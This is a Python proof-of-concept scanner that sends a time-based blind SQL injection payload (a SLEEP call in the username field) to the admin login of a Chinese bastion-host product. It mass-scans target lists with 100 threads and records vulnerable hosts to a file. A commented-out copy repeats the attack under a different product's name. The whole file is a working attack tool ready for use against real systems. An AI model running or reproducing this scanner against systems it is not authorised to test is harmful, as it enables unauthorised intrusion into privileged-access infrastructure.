import sys, argparse, requests, re, time

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = r"""
 _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|





                            version:1.1.0
                            author:fangwei 

    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/admin.php?controller=admin_commonuser"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False)
        if res1.status_code == 200 and "username and password" in res1.text:
            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
            res3 = requests.post(url=target + payload, headers=headers, verify=False)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()
            if time1 - time2 >= 5:
                print(f"[+] 该 {target} 存在延时注入漏洞")
                with open('zyqlre.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
        else:
            print(f"[-] 该 {target} 不存在延时注入漏洞")

    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


if __name__ == '__main__':
    main()

# import sys, argparse, requests, re, time
#
# requests.packages.urllib3.disable_warnings()
# from multiprocessing.dummy import Pool
#
#
# def banner():
#     banner = r"""
#             ____  _     ____  _      ________  _ _     ____  _
#         /_   \/ \ /|/  _ \/ \  /|/  __/\  \/// \ /\/  _ \/ \  /|
#          /   /| |_||| / \|| |\ ||| |  _ \  / | | ||| / \|| |\ ||
#         /   /_| | ||| \_/|| | \||| |_// / /  | \_/|| |-||| | \||
#         \____/\_/ \|\____/\_/  \|\____\/_/   \____/\_/ \|\_/  \|
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="辰信景云终端安全漏洞扫描工具")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/admin.php?controller=admin_commonuser"
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36",
#         "Connection": "close",
#         "Content-Length": "79",
#         "Accept": "*/*",
#         "Content-Type": "application/x-www-form-urlencoded",
#         "Accept-Encoding": "gzip",
#     }
#     data = "username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND 'AAdm'='AAdm"
#     try:
#         start_time = time.time()
#         res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=15)
#         time1 = time.time() - start_time
#
#         start_time = time.time()
#         res2 = requests.get(url=target, headers=headers, verify=False, timeout=15)
#         time2 = time.time() - start_time
#
#         if time1 - time2 >= 5 and time1 > 5:
#             print(f"[+] 该 {target} 存在延时注入漏洞")
#             with open('result4.txt', 'a', encoding='utf-8') as f:
#                 f.write(target + '\n')
#         else:
#             print(f"[-] 该 {target} 不存在延时注入漏洞")
#
#     except Exception as e:
#         print(f"[-] 该 {target} 请求失败: {e}")
#
#
# if __name__ == '__main__':
#     main()
